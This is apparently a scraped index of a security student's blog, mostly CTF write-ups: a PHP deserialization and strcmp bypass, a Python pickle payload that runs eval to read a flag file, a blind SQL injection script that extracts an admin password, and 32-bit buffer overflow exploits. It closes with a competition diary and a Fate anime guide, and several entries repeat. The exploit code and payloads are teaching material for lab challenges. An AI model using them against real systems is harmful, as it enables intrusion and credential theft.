characters can’t be manually copied. So what do we do? … Since they’re program-generated, let’s write code. Just copy the serialize code from above and change token generation to array! php \u003c?php class User { public $name; private $token; function __construct($name) { $this-\u003ename = $name; $this-\u003etoken = array(); } } $user = new User(\"haha\"); echo base64_encode(serialize($user)); Run with PHP online, paste the base64 code back to cookies, refresh page for flag~ ","date":"2020-06-30","objectID":"/en/posts/2020/ais3-2020-preexam-writeups/:6:3","series":null,"tags":["AIS3","CTF-Writeup"],"title":"[Writeup] AIS3 2020 Pre-exam","uri":"/en/posts/2020/ais3-2020-preexam-writeups/#elephant-168-points-165-solves"},{"categories":["Cyber Security"],"content":" Elephant (168 points, 165 solves) DescriptionClicking the link shows a login page (with a hidden easter egg that needs highlighting??) After random input, the text below says token is insufficient to read flag (also has hidden easter egg??) SolutionThis challenge was unexpectedly solved by intuition. I had no idea what the actual point was == Quote “That’s why some challenges are about knowledge gaps, requiring intuition to leap over” by a senior So after competition I had @stavhaygn fully explain this challenge. First, my intuition solution XD After login, take the cookies string and base64 decode to get: text O:4:\"User\":2:{s:4:\"name\";s:4:\"haha\";s:11:\"Usertoken\";s:32:\"6cdc79ae4ac3bd4ade8162dc68d2d50d\";} The format is clearly type:length:data, but I noticed s:11:\"Usertoken\"… shouldn’t the length be 9(?) So I manually changed to s:9:\"Usertoken\", base64 encoded and put back in cookies. Refreshed page and flag appeared… (confused) Actually the format above is called “serialization”. I don’t really understand it since I rarely touch it lol The correct approach is from /.git, which shows 403 forbidden instead of 404 not found. Use GitHack to restore files. php \u003c?php const SESSION = 'elephant_user'; $flag = file_get_contents('/flag'); class User { public $name; private $token; function __construct($name) { $this-\u003ename = $name; $this-\u003etoken = md5($_SERVER['REMOTE_ADDR'] . rand()); } function canReadFlag() { return strcmp($flag, $this-\u003etoken) == 0; } } if (isset($_GET['logout'])) { header('Location: /'); setcookie(SESSION, NULL, 0); exit; } $user = NULL; if ($name = $_POST['name']) { $user = new User($name); header('Location: /'); setcookie(SESSION, base64_encode(serialize($user)), time() + 600); exit; } else if ($data = @$_COOKIE[SESSION]) { $user = unserialize(base64_decode($data)); } Key points in this source code: line 8: token class is private (more later) line 11: token is generated by Random + MD5 Hash line 14: condition to get flag: $flag == $this-\u003etoken line 28: serialize function The key is strcmp bypass. We can’t modify $flag on backend, and can’t control token’s random value. From online info, strcmp returns NULL when comparing string and array. Using PHP’s weak typing, NULL == 0 is true. So we just need to manually modify the serialized string right? text O:4:\"User\":2:{s:4:\"name\";s:4:\"haha\";s:11:\"Usertoken\";a:0:{};} Unfortunately… no. Modifying and encoding back to cookies logs you out. The issue is invisible characters generated by the program, which is also why I noticed strange string lengths. For PHP serialization format, refer to PHP Deserialization Beginner to Advanced. The three permission types in classes: public: data private: %00class name%00member name protected: %00*%00member name This explains why the length I saw was 2 less (%00 * 2), and why direct modification doesn’t work. These invisible characters can’t be manually copied. So what do we do? … Since they’re program-generated, let’s write code. Just copy the serialize code from above and change token generation to array! php \u003c?php class User { public $name; private $token; function __construct($name) { $this-\u003ename = $name; $this-\u003etoken = array(); } } $user = new User(\"haha\"); echo base64_encode(serialize($user)); Run with PHP online, paste the base64 code back to cookies, refresh page for flag~ ","date":"2020-06-30","objectID":"/en/posts/2020/ais3-2020-preexam-writeups/:6:3","series":null,"tags":["AIS3","CTF-Writeup"],"title":"[Writeup] AIS3 2020 Pre-exam","uri":"/en/posts/2020/ais3-2020-preexam-writeups/#description-13"},{"categories":["Cyber Security"],"content":" Elephant (168 points, 165 solves) DescriptionClicking the link shows a login page (with a hidden easter egg that needs highlighting??) After random input, the text below says token is insufficient to read flag (also has hidden easter egg??) SolutionThis challenge was unexpectedly solved by intuition. I had no idea what the actual point was == Quote “That’s why some challenges are about knowledge gaps, requiring intuition to leap over” by a senior So after competition I had @stavhaygn fully explain this challenge. First, my intuition solution XD After login, take the cookies string and base64 decode to get: text O:4:\"User\":2:{s:4:\"name\";s:4:\"haha\";s:11:\"Usertoken\";s:32:\"6cdc79ae4ac3bd4ade8162dc68d2d50d\";} The format is clearly type:length:data, but I noticed s:11:\"Usertoken\"… shouldn’t the length be 9(?) So I manually changed to s:9:\"Usertoken\", base64 encoded and put back in cookies. Refreshed page and flag appeared… (confused) Actually the format above is called “serialization”. I don’t really understand it since I rarely touch it lol The correct approach is from /.git, which shows 403 forbidden instead of 404 not found. Use GitHack to restore files. php \u003c?php const SESSION = 'elephant_user'; $flag = file_get_contents('/flag'); class User { public $name; private $token; function __construct($name) { $this-\u003ename = $name; $this-\u003etoken = md5($_SERVER['REMOTE_ADDR'] . rand()); } function canReadFlag() { return strcmp($flag, $this-\u003etoken) == 0; } } if (isset($_GET['logout'])) { header('Location: /'); setcookie(SESSION, NULL, 0); exit; } $user = NULL; if ($name = $_POST['name']) { $user = new User($name); header('Location: /'); setcookie(SESSION, base64_encode(serialize($user)), time() + 600); exit; } else if ($data = @$_COOKIE[SESSION]) { $user = unserialize(base64_decode($data)); } Key points in this source code: line 8: token class is private (more later) line 11: token is generated by Random + MD5 Hash line 14: condition to get flag: $flag == $this-\u003etoken line 28: serialize function The key is strcmp bypass. We can’t modify $flag on backend, and can’t control token’s random value. From online info, strcmp returns NULL when comparing string and array. Using PHP’s weak typing, NULL == 0 is true. So we just need to manually modify the serialized string right? text O:4:\"User\":2:{s:4:\"name\";s:4:\"haha\";s:11:\"Usertoken\";a:0:{};} Unfortunately… no. Modifying and encoding back to cookies logs you out. The issue is invisible characters generated by the program, which is also why I noticed strange string lengths. For PHP serialization format, refer to PHP Deserialization Beginner to Advanced. The three permission types in classes: public: data private: %00class name%00member name protected: %00*%00member name This explains why the length I saw was 2 less (%00 * 2), and why direct modification doesn’t work. These invisible characters can’t be manually copied. So what do we do? … Since they’re program-generated, let’s write code. Just copy the serialize code from above and change token generation to array! php \u003c?php class User { public $name; private $token; function __construct($name) { $this-\u003ename = $name; $this-\u003etoken = array(); } } $user = new User(\"haha\"); echo base64_encode(serialize($user)); Run with PHP online, paste the base64 code back to cookies, refresh page for flag~ ","date":"2020-06-30","objectID":"/en/posts/2020/ais3-2020-preexam-writeups/:6:3","series":null,"tags":["AIS3","CTF-Writeup"],"title":"[Writeup] AIS3 2020 Pre-exam","uri":"/en/posts/2020/ais3-2020-preexam-writeups/#solution-14"},{"categories":["Cyber Security"],"content":" Snake (Post-solved, 272 points, 137 solves) DescriptionOpening the link shows the code as plain text on the page. python from flask import Flask, Response, request import pickle, base64, traceback Response.default_mimetype = 'text/plain' app = Flask(__name__) @app.route(\"/\") def index(): data = request.values.get('data') if data is not None: try: data = base64.b64decode(data) data = pickle.loads(data) if data and not data: return open('/flag').read() return str(data) except: return traceback.format_exc() return open(__file__).read() SolutionUnderstanding this code: line 10: we can use suffix /?data= with a string line 14: string must be base64 format line 15: pickle… ? Turns out it’s the hungry part (X) line 17: condition that can never be true Searching “pickle ctf” on Google finds lots of info. Refer to Pickle Deserialization Primer. Simply put, pickle is a Python library for serialization and deserialization. When we send a serialized string via URL, the Server deserializes and executes __reduce__ in the object. So we design __reduce__ to system read /flag file, and the Server returns the flag contents. Note the return format (callable, tuple), where the latter’s parameter is passed to the former. python import pickle import base64 class test(object): def __reduce__(self): return( eval, (\"open('/flag').read()\",) ) print(base64.b64encode(pickle.dumps(test()))) Just throw the generated base64 code to URL suffix for flag~ /?data=Y19fYnVpbHRpbl9fCmV2YWwKcDAKKFMib3BlbignL2ZsYWcnKS5yZWFkKCkiCnAxCnRwMgpScDMKLg== ","date":"2020-06-30","objectID":"/en/posts/2020/ais3-2020-preexam-writeups/:6:4","series":null,"tags":["AIS3","CTF-Writeup"],"title":"[Writeup] AIS3 2020 Pre-exam","uri":"/en/posts/2020/ais3-2020-preexam-writeups/#snake-post-solved-272-points-137-solves"},{"categories":["Cyber Security"],"content":" Snake (Post-solved, 272 points, 137 solves) DescriptionOpening the link shows the code as plain text on the page. python from flask import Flask, Response, request import pickle, base64, traceback Response.default_mimetype = 'text/plain' app = Flask(__name__) @app.route(\"/\") def index(): data = request.values.get('data') if data is not None: try: data = base64.b64decode(data) data = pickle.loads(data) if data and not data: return open('/flag').read() return str(data) except: return traceback.format_exc() return open(__file__).read() SolutionUnderstanding this code: line 10: we can use suffix /?data= with a string line 14: string must be base64 format line 15: pickle… ? Turns out it’s the hungry part (X) line 17: condition that can never be true Searching “pickle ctf” on Google finds lots of info. Refer to Pickle Deserialization Primer. Simply put, pickle is a Python library for serialization and deserialization. When we send a serialized string via URL, the Server deserializes and executes __reduce__ in the object. So we design __reduce__ to system read /flag file, and the Server returns the flag contents. Note the return format (callable, tuple), where the latter’s parameter is passed to the former. python import pickle import base64 class test(object): def __reduce__(self): return( eval, (\"open('/flag').read()\",) ) print(base64.b64encode(pickle.dumps(test()))) Just throw the generated base64 code to URL suffix for flag~ /?data=Y19fYnVpbHRpbl9fCmV2YWwKcDAKKFMib3BlbignL2ZsYWcnKS5yZWFkKCkiCnAxCnRwMgpScDMKLg== ","date":"2020-06-30","objectID":"/en/posts/2020/ais3-2020-preexam-writeups/:6:4","series":null,"tags":["AIS3","CTF-Writeup"],"title":"[Writeup] AIS3 2020 Pre-exam","uri":"/en/posts/2020/ais3-2020-preexam-writeups/#description-14"},{"categories":["Cyber Security"],"content":" Snake (Post-solved, 272 points, 137 solves) DescriptionOpening the link shows the code as plain text on the page. python from flask import Flask, Response, request import pickle, base64, traceback Response.default_mimetype = 'text/plain' app = Flask(__name__) @app.route(\"/\") def index(): data = request.values.get('data') if data is not None: try: data = base64.b64decode(data) data = pickle.loads(data) if data and not data: return open('/flag').read() return str(data) except: return traceback.format_exc() return open(__file__).read() SolutionUnderstanding this code: line 10: we can use suffix /?data= with a string line 14: string must be base64 format line 15: pickle… ? Turns out it’s the hungry part (X) line 17: condition that can never be true Searching “pickle ctf” on Google finds lots of info. Refer to Pickle Deserialization Primer. Simply put, pickle is a Python library for serialization and deserialization. When we send a serialized string via URL, the Server deserializes and executes __reduce__ in the object. So we design __reduce__ to system read /flag file, and the Server returns the flag contents. Note the return format (callable, tuple), where the latter’s parameter is passed to the former. python import pickle import base64 class test(object): def __reduce__(self): return( eval, (\"open('/flag').read()\",) ) print(base64.b64encode(pickle.dumps(test()))) Just throw the generated base64 code to URL suffix for flag~ /?data=Y19fYnVpbHRpbl9fCmV2YWwKcDAKKFMib3BlbignL2ZsYWcnKS5yZWFkKCkiCnAxCnRwMgpScDMKLg== ","date":"2020-06-30","objectID":"/en/posts/2020/ais3-2020-preexam-writeups/:6:4","series":null,"tags":["AIS3","CTF-Writeup"],"title":"[Writeup] AIS3 2020 Pre-exam","uri":"/en/posts/2020/ais3-2020-preexam-writeups/#solution-15"},{"categories":["Cyber Security"],"content":" Scoreboard ","date":"2020-06-30","objectID":"/en/posts/2020/ais3-2020-preexam-writeups/:7:0","series":null,"tags":["AIS3","CTF-Writeup"],"title":"[Writeup] AIS3 2020 Pre-exam","uri":"/en/posts/2020/ais3-2020-preexam-writeups/#scoreboard"},{"categories":["Cyber Security"],"content":"TJCTF 2020 Weak Password challenge writeup","date":"2020-05-29","objectID":"/en/posts/2020/tjctf-2020-weakpassword/","series":null,"tags":["TJCTF","Web Security","CTF-Writeup"],"title":"[Writeup] TJCTF 2020 - Weak Password (Blind SQL injection)","uri":"/en/posts/2020/tjctf-2020-weakpassword/"},{"categories":["Cyber Security"],"content":"Writeup from MacacaHub TJCTF 2020 Writeups Although this challenge is called Weak Password, I really couldn’t crack it at the time ;w; After the competition, a teammate pointed out that it was actually a Blind SQL injection. My usual ' or 1=1 -- poking was really just child’s play lol ","date":"2020-05-29","objectID":"/en/posts/2020/tjctf-2020-weakpassword/:0:0","series":null,"tags":["TJCTF","Web Security","CTF-Writeup"],"title":"[Writeup] TJCTF 2020 - Weak Password (Blind SQL injection)","uri":"/en/posts/2020/tjctf-2020-weakpassword/#"},{"categories":["Cyber Security"],"content":" DescriptionIt seems your login bypass skills are now famous! One of my friends has given you a challenge: figure out his password on this [site] (https://weak_password.tjctf.org/). He’s told me that his username is admin, and that his password is made of up only lowercase letters and numbers. (Wrap the password with tjctf{…}) ","date":"2020-05-29","objectID":"/en/posts/2020/tjctf-2020-weakpassword/:1:0","series":null,"tags":["TJCTF","Web Security","CTF-Writeup"],"title":"[Writeup] TJCTF 2020 - Weak Password (Blind SQL injection)","uri":"/en/posts/2020/tjctf-2020-weakpassword/#description"},{"categories":["Cyber Security"],"content":" SolutionThe title is also Weak Password. In T-Cat Cup it was just admin:admin, but here it’s not that simple XD From the given username as admin and the SQL syntax and field information visible in the source code, we can guess this challenge uses Blind SQL injection. For some basic guessing methods, refer to [SQL Injection(Blind)] (https://www.twblogs.net/a/5d0d7134bd9eee1ede0450b0). Of course, you could manually guess each character of the password from the webpage, but as a future engineer… let’s just write some code :) How to Guess? Through SQL injection and using login results to determine success, we try to extract the information we want from username. For example, guessing password length: admin' and length(password) \u003e 13 -- –\u003e success admin' and length(password) \u003e 14 -- –\u003e fail admin' and length(password) = 14 -- –\u003e success We can determine password length is 14. Another example, guessing password first character: admin' and unicode(substr(password, 1)) \u003e unicode('a') -- –\u003e success admin' and unicode(substr(password, 1)) \u003e unicode('b') -- –\u003e fail admin' and unicode(substr(password, 1)) = unicode('b') -- –\u003e success We can determine password first character is b. Now it’s time to write code. We can use Binary search to speed up the search and use the returned request length to determine if the result is successful. python import requests import string # Send request and get result def inject(n, opr, char): url = 'https://weak_password.tjctf.org/login' payload = {\"username\": \"admin' and unicode(substr(password, {})) \\\\ {} unicode('{}')-- \".format(n, opr,char), \"password\": \"123\"} r = requests.post(url, data=payload) return True if len(r.text)==1842 else False #1842:success res = \"\" li = list(string.digits + string.ascii_lowercase) for i in range(1, 20): l = 0 r = len(li) - 1 # end up binary search if it can't checkout any character if inject(i, '\u003e', li[0]) == False: print('password: ' + res) break while l \u003c= r: mid = (l + (r + 1)) // 2 #print(l, r, mid) if inject(i, '=', li[mid]): res = res + li[mid] break elif inject(i, '\u003e', li[mid]): l = mid elif inject(i, '\u003c', li[mid]): r = mid else: break print(res) ","date":"2020-05-29","objectID":"/en/posts/2020/tjctf-2020-weakpassword/:2:0","series":null,"tags":["TJCTF","Web Security","CTF-Writeup"],"title":"[Writeup] TJCTF 2020 - Weak Password (Blind SQL injection)","uri":"/en/posts/2020/tjctf-2020-weakpassword/#solution"},{"categories":["Cyber Security"],"content":" Result ","date":"2020-05-29","objectID":"/en/posts/2020/tjctf-2020-weakpassword/:2:1","series":null,"tags":["TJCTF","Web Security","CTF-Writeup"],"title":"[Writeup] TJCTF 2020 - Weak Password (Blind SQL injection)","uri":"/en/posts/2020/tjctf-2020-weakpassword/#result"},{"categories":["Cyber Security"],"content":"NSYSU InfoSec Club Pwn tutorial covering Buffer Overflow basics","date":"2020-03-22","objectID":"/en/posts/2020/nsysuisc-pwn-01/","series":null,"tags":["NSYSUISC Security Club","Pwn Challenge"],"title":"[NSYSU Security Club] Pwn Basic #1","uri":"/en/posts/2020/nsysuisc-pwn-01/"},{"categories":["Cyber Security"],"content":"After about a semester of CTF baptism, I finally have some understanding of this field :D Originally this blog was supposed to be technically-oriented, but somehow I’ve been using it for random posts instead… For my first writeup, I decided to practice with the club’s exercises. On one hand, it helps me extend my thinking while learning. On the other hand, it can give friends without a security background a simple introduction to Pwn - otherwise I never know how to explain it when asked (face palm) Hmm, not knowing how to explain security stuff… that’s probably my problem Orz “Pwn” - some pronounce it one way, some another. I usually say “pown” or “pun”. The common approach is to attack vulnerabilities in programs (privilege escalation), with a sense of “player has been owned.” Some also say it’s a combination of Penetration + Own. Anyway, that’s roughly the idea~ In CTF, basic Pwn challenges usually give you a text file you can’t read, hoping you’ll exploit program vulnerabilities to get root privileges and capture the flag. For me, here are some commands I commonly use when first getting a challenge: ls -al to understand files in the directory and execution permissions file to confirm file type and bit size checksec to see what protection mechanisms the ELF has enabled Now let's start solving! ovo ","date":"2020-03-22","objectID":"/en/posts/2020/nsysuisc-pwn-01/:0:0","series":null,"tags":["NSYSUISC Security Club","Pwn Challenge"],"title":"[NSYSU Security Club] Pwn Basic #1","uri":"/en/posts/2020/nsysuisc-pwn-01/#"},{"categories":["Cyber Security"],"content":" 0x01: PasswordFirst, let’s look at the files provided for this challenge. text password password.c flag.txt For the first file password, we can use the file command to check its file type. bash $ file ./password password: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 2.6.32, BuildID[sha1]=78715d2680bfeafa1b0a97978bfe8816be4d8423, not stripped We can see it’s an ELF executable under Linux, the most common file type in CTF. Though when downloading with Safari on MacOS, it mysteriously adds .dms - the first time I saw that, I thought the file was corrupted XD (checking with file shows no problem). Also, the Pwn basics from the club are mainly 32-bits, simpler than 64-bits for teaching purposes. Next, let’s try running it… Huh? Can’t execute? Using ls reveals the file doesn’t have execution permission. Use chmod to change file permissions. For more details, check out Bird’s Linux Private Kitchen - Linux File Permissions and Directory Configuration. bash $ ls -al -rw-r-xr-x@ [other information] password $ chmod +x ./password $ ls -al -rwxr-xr-x@ [other information] password After modifying execution permissions, run it to see what the program does. In basic Pwn challenges, some defense mechanisms are intentionally disabled. Use checksec to see what protections are enabled for this executable. shell $ checksec ./password Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) It’s normal not to understand these protection mechanisms at first. Simply put: RELRO won’t be used for now; mainly used to prevent lazy Binding issues Stack canary being off allows your input to exceed the specified length and overwrite strange addresses - basically enabling Buffer Overflow NX enabled means you can’t inject evil commands to execute in the program; we’ll practice this later PIE off means when analyzing the executable, you see “absolute addresses”; if on, you only see address offsets which are harder to exploit P.S. There’s also ASLR not shown in checksec, which randomizes stack, heap, etc. addresses each execution to prevent attackers from locating memory addresses More details on this should come in future club sessions; having a basic understanding for now is enough. Also, the club’s basic challenges helpfully include the source code, ╭(ᐛ)╯Bless the instructor╭(ᐛ)╯ c int main() { ... char password[12] = \"12345678\"; char name[8]; printf(\"What's your name? \"); gets(name); printf(\"Hello %s\\n\", name); if (!strcmp(password, \"password\")) { puts(\"Welcome :) \"); shell(); return 0; } printf(\"QQ %s\\n\", password); exit(0); } This code shouldn’t be difficult for anyone who’s programmed before. The challenge asks for input name, then compares variable password with “password”. If the condition passes, it executes shell(). Notice there’s no way to input the password variable - it only outputs “QQ password” at the end. First-timers to Pwn seeing this strange condition would probably be full of questions. However, we can first input something random and observe. Like name is 8 bytes, input “12345678”, and you get: shell $ What's your name? 12345678 $ Hello 12345678 QQ Segmentation fault However, if you input more than 8 bytes like “1234567890”: shell $ What's your name? 1234567890 $ Hello 1234567890 QQ 90 Segmentation fault Hmm? Even though we didn’t input anything for password, its content seems to have been changed XD That’s right! The main point of this challenge is: Note gets() is an unsafe input function because it doesn’t limit user input length. Therefore, without canary, it’s vulnerable to Buffer Overflow attacks! For this challenge, we can use the disassembly command objdump to understand the program structure shell $ objdump -d -M intel ./password The Stack content drawn as a diagram looks roughly like this This time if we input “aaaaaaaahaha”, “haha” will overwrite the password variable’s value. Smart you should know what to do now ","date":"2020-03-22","objectID":"/en/posts/2020/nsysuisc-pwn-01/:1:0","series":null,"tags":["NSYSUISC Security Club","Pwn Challenge"],"title":"[NSYSU Security Club] Pwn Basic #1","uri":"/en/posts/2020/nsysuisc-pwn-01/#0x01-password"},{"categories":["Cyber Security"],"content":" 0x02: BOFFiles provided for this challenge: text bof bof.c flag.txt Similarly, flag doesn’t have read permission. Let’s check what protections bof has enabled. Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) Hmm… very similar format to the previous challenge. Let’s look at the bof.c source code c void shell() { system(\"/bin/sh\"); } void vuln() { char str[48]; printf(\"Input: \"); gets(str); return; } int main() { ... vuln(); return 0; } The overall structure looks similar to the previous challenge, also targeting the dangerous gets() vulnerability. But this time… there’s no way to execute shell() at all!!! The main point of this challenge is: Note Exploit gets()’s unlimited input length vulnerability for Buffer Overflow. And overwrite vuln()’s return address (which should go back to main()) with shell()’s address. Hmm… Huh!? I believe those who’ve studied OS are familiar with this, but knowing is one thing - how do we actually do it? Let’s use objdump to see what’s inside. shell $ objdump -d -M intel ./bof shell 080484eb \u003cshell\u003e: 80484eb: 55 push ebp 80484ec: 89 e5 mov ebp,esp 80484ee: 68 e0 85 04 08 push 0x80485e0 80484f3: e8 b8 fe ff ff call 80483b0 \u003csystem@plt\u003e 80484f8: 83 c4 04 add esp,0x4 80484fb: 90 nop 80484fc: c9 leave 80484fd: c3 ret 080484fe \u003cvuln\u003e: 80484fe: 55 push ebp 80484ff: 89 e5 mov ebp,esp 8048501: 83 ec 30 sub esp,0x30 8048504: 68 e8 85 04 08 push 0x80485e8 8048509: e8 82 fe ff ff call 8048390 \u003cprintf@plt\u003e 804850e: 83 c4 04 add esp,0x4 8048511: 8d 45 d0 lea eax,[ebp-0x30] 8048514: 50 push eax 8048515: e8 86 fe ff ff call 80483a0 \u003cgets@plt\u003e 804851a: 83 c4 04 add esp,0x4 804851d: 90 nop 804851e: c9 leave 804851f: c3 ret The key is line 18’s ebp-0x30. We need to understand the variable’s relative position. Drawing the stack frame looks like this ↓↓↓ This means the challenge wants us to fill str[48] and use Buffer Overflow to overwrite the return address with shell()’s address. Next we need to find line 1 shell()’s function address. If we overwrite everything with “a”, the expected result looks like this:) Now that we know how to overwrite the return address, we just need to write the payload. python from pwn import * conn = process('./bof') # Payload has three parts: fill str[48], overwrite old ebp, overwrite return address with shell() # Note that since 32-bit is little-endian, use p32() to convert to \\xeb\\x84\\x04\\x08 format payload = 'a'*48 + 'aaaa' + p32(0x080484eb) print(payload) conn.sendline(payload) conn.interactive() This gets root privileges to read the flag. Of course, if you’re lazy to write a file, there’s also a one-liner XD shell $ (python -c \"print('a'*48 + 'a'*4 + '\\xeb\\x84\\x04\\x08')\"; cat) | ./bof That’s about it~ Took longer to write than expected, and I originally wanted to cover three challenges in one post, but the first one’s introduction went too long QQ That’s all, hope I can continue finishing the challenges (escapes) ","date":"2020-03-22","objectID":"/en/posts/2020/nsysuisc-pwn-01/:2:0","series":null,"tags":["NSYSUISC Security Club","Pwn Challenge"],"title":"[NSYSU Security Club] Pwn Basic #1","uri":"/en/posts/2020/nsysuisc-pwn-01/#0x02-bof"},{"categories":["Cyber Security"],"content":"2019 CSC Golden Shield cybersecurity competition finals experience","date":"2019-11-16","objectID":"/en/posts/2019/csc-final-experience/","series":null,"tags":["CSC Competition","Daily Chat"],"title":"[Sharing] 2019 CSC Cyber Security Competition Finals - All-You-Can-Eat McDonald's ฅ'ω'ฅ","uri":"/en/posts/2019/csc-final-experience/"},{"categories":["Cyber Security"],"content":" Long time no post, just tidying up this dusty blog a bit (laughs) I’ve been in the security lab for three months without realizing it… And this CSC (Cyber Security Competition) was my first on-site cybersecurity competition! ","date":"2019-11-16","objectID":"/en/posts/2019/csc-final-experience/:0:0","series":null,"tags":["CSC Competition","Daily Chat"],"title":"[Sharing] 2019 CSC Cyber Security Competition Finals - All-You-Can-Eat McDonald's ฅ'ω'ฅ","uri":"/en/posts/2019/csc-final-experience/#"},{"categories":["Cyber Security"],"content":" Date: 10/19 (Sat.)The southern CSC preliminaries were held at Kun Shan University. I remember our lab sent three teams. Early in the morning, we took the local train all the way from Gushan Station to Tainan. Whose idea was that Zzzz That same afternoon there was also MOPCON and MOPCON Beengaged Night, thinking about it, that day’s schedule was really exhausting. Anyway, we woke up early to catch the train, and teammate @cfhfelix wasn’t feeling well. So we finished the 50 written questions, but only solved one out of five practical questions QQ (the only one we got was a Web SQL injection…) Our team leader @stavhaygn poked around and the flag just unexpectedly came out (?) I heard this year’s preliminaries were supposedly harder than usual… And the result was Well well, so the practical part just won’t be counted (ㆆᴗㆆ)! And, out of the three teams our lab sent, only ours advanced (!? Credit for the written part goes to @cfhfelix. I heard he just straight up studied the Information Security Concepts v3 textbook recently 6666 Here’s the finals list. Including high school and junior high, there were 131 teams total, with 34 college teams advancing to finals. I heard the other NSYSU team on the list was from the Information Management department. Anyway, being my first time participating, I didn’t know anyone XD Then seeing all those teams from NTU, NCTU, NTHU, I didn’t really care about the final ranking anymore (hey). But I was really looking forward to eating McDonald’s hehe ","date":"2019-11-16","objectID":"/en/posts/2019/csc-final-experience/:1:0","series":null,"tags":["CSC Competition","Daily Chat"],"title":"[Sharing] 2019 CSC Cyber Security Competition Finals - All-You-Can-Eat McDonald's ฅ'ω'ฅ","uri":"/en/posts/2019/csc-final-experience/#date-1019-sat"},{"categories":["Cyber Security"],"content":" Date: 11/15 (Fri.)The CSC finals were at the Chang Yung-Fa Foundation International Convention Center in Taipei. Thankfully the required Friday seminar class was suspended that week, otherwise I might have been OUT from missing too many sessions… We gathered at 6 AM and headed out from NSYSU, transferring through KMRT ➜ HSR ➜ MRT, arriving at the venue around 9 AM. This time the challenge categories included the usual Reverse, Web, Pwn, Crypto, Misc, plus Critical Infrastructure (CI). After the briefing, the CI challenges sounded super cool. Apparently they were a new challenge type this year! Then it was snack time. I have to say the treatment at this competition was really great (munch) Then came the much-anticipated lunch time! As you can probably tell from the cover image lol. I heard McDonald’s has always been a CSC tradition (? Anyway, grab whatever McDonald’s you want from the table. The most popular was the 20-piece chicken nuggets sharing box - limited quantity, really fought over. Interestingly, our team of three accidentally grabbed two boxes of nuggets, so we quickly gave one away to avoid getting stared at XDDDD Oh right! There’s also this… ethernet cable adapter… We really didn’t expect the network provided would be physical ethernet cables instead of wireless WIFI. None of our three laptops could plug in ethernet directly, and nobody thought to bring an adapter… So we rushed to the front desk to borrow three with our IDs as deposit, otherwise we would’ve just been watching others compete XDDDDD Then came the long 5-hour main competition - let’s go! First, having external internet access was quite novel to me, since previous competitive programming contests I attended were no-internet environments where you could only bring a codebook. But this also meant the problems might be complex enough that hours of Googling wouldn’t help… And that was indeed the case QQ Even if you found other CTF writeups, they might not have the same approach. You had to find solutions yourself (headache) Opening only had 5 problems: 500 pts × 3, 200 pts × 2 As a newbie, I of course opened them one by one to look. Any ELF I got, I ran through basic operations like file, strings. Any IP address, I tried guessing robot.txt, NMAP, F12 tricks … It definitely wasn’t as easy as the recent picoCTF QQ Shortly after, @stavhaygn found that one IP’s :8080/upload had a page where you could upload .rar files. After getting the heads up, I started looking for related challenge types or shells I could package into .rar. ^^^That was roughly the feeling - still very unfamiliar with problems and various terms^^^ After about 1hr, I heard @stavhaygn click his tongue and solve a Pwn (200), but we probably found it too late. The original 200 points had dropped to who knows how much (see the notes in the image above) Another teammate @cfhfelix was poking at the 500 pt PT challenge. Apparently there was even a built-in chat to talk with other teams (?) But the bug got patched later. Before that, he got a fake key and wasted one attempt QQ 1.5hr in, remaining 5 problems opened: 200 pts × 1, 300 pts × 4 I gave up on the .rar upload problem and decided to work on Crypto (500) based on official hints. After researching related encryption methods and spending some time writing a C++ program to match the lookup table, I got a directory address. Combining IP + directory led to a secret.zip and xxx.txt. After more research, I learned I needed to use a known plaintext attack to crack the .zip. By the way, xxx.txt contained base64 encoding. Coincidentally, the security club session the day before covered base64 characteristics. Converting it online gave me the encryption method (AES) inside the .rar, but I still needed to crack the .zip. Following @stavhaygn’s instructions, I went to research fcrack (got burned by pkcrack and zip versions along the way… unfamiliarity with tools was also a big issue==) Anyway, with 1.5hr left in the competition, I ran fcrack for 1hr tryi","date":"2019-11-16","objectID":"/en/posts/2019/csc-final-experience/:2:0","series":null,"tags":["CSC Competition","Daily Chat"],"title":"[Sharing] 2019 CSC Cyber Security Competition Finals - All-You-Can-Eat McDonald's ฅ'ω'ฅ","uri":"/en/posts/2019/csc-final-experience/#date-1115-fri"},{"categories":["Entertainment ACGN"],"content":"Fate series anime world guide - watch order from Fate/stay night to FGO","date":"2019-08-26","objectID":"/en/posts/2019/fate-anime-talk/","series":null,"tags":["TypeMoon","Fate"],"title":"[TYPE-MOON] A Brief Look at the Fate Series World (Anime Edition)","uri":"/en/posts/2019/fate-anime-talk/"},{"categories":["Entertainment ACGN"],"content":" I never expected TM to grow this big since 2000… It’s reached the point where you need a guidebook to understand it. The reason I wrote this article is because of this Bahamut (Taiwan forum) post: RE: Question - What types of anime are there currently? P.S. The original discussion thread has been deleted due to being outdated Yes, it was my humble reply ٩(ˊᗜˋ*)و This post was also placed in a corner of the TYPE-MOON Bahamut section's pinned area. Looking at the reply date from 2015, four years have passed in the blink of an eye. Since Bahamut’s system deletes old posts and there have been many Fate spinoff anime adaptations in recent years, I’m taking advantage of some free time at the end of summer break to organize the anime up to now and briefly introduce the TYPE-MOON (hereafter TM) world. Although the title says “Fate Series,” the entire series is actually categorized under the TM circle. So some scenes in the Fate world more or less connect with other TM works (Tsukihime, Kara no Kyoukai, Mahoutsukai no Yoru), and TM’s 10th anniversary commemorative anime even mixed in a bunch of Fate series character references XD ","date":"2019-08-26","objectID":"/en/posts/2019/fate-anime-talk/:0:0","series":null,"tags":["TypeMoon","Fate"],"title":"[TYPE-MOON] A Brief Look at the Fate Series World (Anime Edition)","uri":"/en/posts/2019/fate-anime-talk/#"},{"categories":["Entertainment ACGN"],"content":" Fate Main StoryLet me briefly explain the Fate main story. Originally, Fate/Stay Night debuted as an R18 PC visual novel game. Based on dialogue choices, the story has three main routes (world lines) as endings: the Fate route (also called Saber route), UBW route (also called Rin route), and HF route (also called Sakura route). The anime adaptations use these three routes as their respective main storylines, with some modifications to the plot. The story background of Fate/Stay Night mentioned above is the Fifth Holy Grail War in Fuyuki City. The later Fate/Zero is the Fourth Holy Grail War, the so-called prequel! New fans asking: There are so many Fate series, where should I start watching the anime? In principle, the three world lines of Fate/Stay Night don’t conflict with each other. I personally recommend following the broadcast order. On one hand, it’s about accepting different art styles (I’ve been spoiled by ufotable’s beautiful animation and can’t go back to the 2006 F/SN anymore). On the other hand, some scenes need to be watched in 